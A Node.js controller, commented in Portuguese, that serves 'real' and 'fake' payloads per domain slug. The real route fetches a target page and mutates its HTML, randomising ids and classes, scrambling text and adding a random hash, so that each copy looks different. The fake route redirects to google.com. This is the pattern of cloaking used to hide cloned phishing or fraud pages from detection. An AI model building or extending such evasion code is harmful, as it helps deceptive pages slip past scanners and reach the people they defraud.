const Domain = require("../models/Domain");
const fetch = require("node-fetch");

function randomString(len = 6) {
  return Math.random().toString(36).substring(2, 2 + len);
}

function scrambleText(text) {
  return text
    .split("")
    .map(ch => {
      if (/[aeiou]/i.test(ch) && Math.random() > 0.5) {
        return ch.toUpperCase();
      }
      if (Math.random() > 0.8) {
        return Math.random() > 0.5 ? ch + randomString(1) : ch;
      }
      return ch;
    })
    .join("");
}

function mutateHTMLFull(html) {
  return html
    .replace(/id="([^"]+)"/g, () => `id="${randomString(8)}"`)
    .replace(/class="([^"]+)"/g, () => `class="${randomString(6)}"`)
    .replace(/>([^<]{3,30})</g, (match, p1) => ">" + scrambleText(p1) + "<")
    + `\n<!--hash:${randomString(12)}-->`;
}

function mutateHTMLSafe(html) {
  return html
    .replace(/id="([^"]+)"/g, (m, id) => {
      if (["app", "root"].includes(id)) return m;
      return `id="${randomString(8)}"`;
    })
    .replace(/class="([^"]+)"/g, (m, cls) => {
      if (/btn|main-wrapper|content|header/.test(cls)) return m;
      return `class="${randomString(6)}"`;
    })
    .replace(/>([^<]{3,30})</g, (match, p1) => {
      return ">" + scrambleText(p1) + "<";
    })
    + `\n<!--hash:${randomString(12)}-->`;
}

// Serve payload real com mutação
async function serveRealPayload(req, res) {
  const { slug } = req.params;
  const domain = await Domain.findOne({ slug });
  if (!domain || !domain.baseUrl) return res.send("<h1>Payload vazio</h1>");

  try {
    const response = await fetch(domain.baseUrl);
    let html = await response.text();

    const mutated = mutateHTMLSafe(html); // usa Safe por padrão
    res.setHeader("Content-Type", "text/html");
    res.send(mutated);
  } catch (err) {
    console.error("Erro ao gerar payload real:", err);
    return res.send("<h1>Erro ao gerar payload</h1>");
  }
}

// Fake payload continua igual
async function serveFakePayload(req, res) {
  return res.redirect("https://google.com");
}

module.exports = { serveRealPayload, serveFakePayload };
